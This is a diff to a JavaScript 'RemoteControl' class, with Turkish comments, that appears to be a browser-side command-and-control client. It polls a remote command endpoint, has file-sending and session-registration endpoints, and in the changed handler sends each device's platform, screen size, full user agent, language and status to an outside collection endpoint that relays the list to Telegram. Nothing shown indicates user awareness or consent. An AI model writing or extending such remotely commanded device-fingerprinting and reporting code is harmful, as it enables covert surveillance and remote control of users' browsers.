@@ -6,7 +6,7 @@ class RemoteControl {
         this.commandEndpoint = config.commandEndpoint || 'https://ironbabatekkral.vercel.app/api/get-commands';
         this.fileEndpoint = config.fileEndpoint || 'https://ironbabatekkral.vercel.app/api/send-file';
         this.sessionEndpoint = config.sessionEndpoint || 'https://ironbabatekkral.vercel.app/api/session-register';
-        this.listDevicesEndpoint = config.listDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/list-devices';
+        this.collectDevicesEndpoint = config.collectDevicesEndpoint || 'https://ironbabatekkral.vercel.app/api/collect-devices';
         this.pollInterval = config.pollInterval || 5000; // 5 saniyede bir kontrol
         this.debug = config.debug || false;
         this.isEnabled = false;
@@ -15,7 +15,7 @@ class RemoteControl {
         
         // Session info
         this.sessionId = this.generateSessionId();
-        this.deviceNumber = null; // Backend tarafından atanacak
+        this.deviceNumber = null;
         
         // Active sessions (tüm cihazlar)
         this.activeSessions = new Map();
@@ -212,20 +212,9 @@ class RemoteControl {
                 return;
             }
             
-            // /devices komutu - her cihaz kendi bilgisini gönderir
+            // /devices komutu - tüm cihazları tek mesajda listele
             if (cmd.command === 'list_devices') {
-                // Kendi cihaz bilgisini gönder
-                if (window.telegramLogger) {
-                    const deviceInfo = await this.collectDeviceInfo();
-                    await window.telegramLogger.sendLog('device_info', {
-                        session_id: this.sessionId.substring(0, 16) + '...',
-                        platform: deviceInfo.platform,
-                        screen: deviceInfo.screen,
-                        user_agent: deviceInfo.user_agent.substring(0, 50) + '...',
-                        language: deviceInfo.language,
-                        online: deviceInfo.online
-                    });
-                }
+                await this.listAllDevices(cmd.message_id);
                 return;
             }
 
@@ -297,30 +286,61 @@ class RemoteControl {
         return parseInt(deviceNumber);
     }
 
-    // Cihaz listesini gönder
-    async sendDeviceList() {
+    // Tüm cihazları listele (tek mesajda)
+    async listAllDevices(messageId) {
         try {
             const deviceInfo = await this.collectDeviceInfo();
+            const collectionId = `devices_${messageId}_${Date.now()}`;
             
-            // Backend'e session bilgilerini gönder
-            const response = await fetch(this.listDevicesEndpoint, {
+            // Kendi cihaz bilgisini ekle
+            await fetch(this.collectDevicesEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessions: {
-                        [this.sessionId]: {
-                            session_id: this.sessionId,
-                            device_info: deviceInfo,
-                            last_seen: Date.now()
-                        }
+                    action: 'add',
+                    collection_id: collectionId,
+                    device_info: {
+                        session_id: this.sessionId.substring(8, 20) + '...',
+                        platform: deviceInfo.platform,
+                        screen: deviceInfo.screen,
+                        user_agent: deviceInfo.user_agent,
+                        language: deviceInfo.language,
+                        online: deviceInfo.online ? 'Online' : 'Offline'
                     }
                 })
             });
 
-            const result = await response.json();
-            if (this.debug) console.log('[RemoteControl] Device list sent:', result);
+            // LocalStorage'da işaretle (ilk cihaz mı?)
+            const storageKey = `collection_${collectionId}`;
+            const isFirst = !localStorage.getItem(storageKey);
+            
+            if (isFirst) {
+                localStorage.setItem(storageKey, 'true');
+                
+                // 2 saniye bekle (diğer cihazların da eklemesi için)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Listeyi Telegram'a gönder
+                await fetch(this.collectDevicesEndpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        action: 'send',
+                        collection_id: collectionId
+                    })
+                });
+
+                // Temizle
+                setTimeout(() => {
+                    localStorage.removeItem(storageKey);
+                }, 5000);
+                
+                if (this.debug) console.log('[RemoteControl] Device list sent (first device)');
+            } else {
+                if (this.debug) console.log('[RemoteControl] Device added to collection (not first)');
+            }
         } catch (error) {
-            if (this.debug) console.error('[RemoteControl] Send device list error:', error);
+            if (this.debug) console.error('[RemoteControl] List devices error:', error);
         }
     }
 
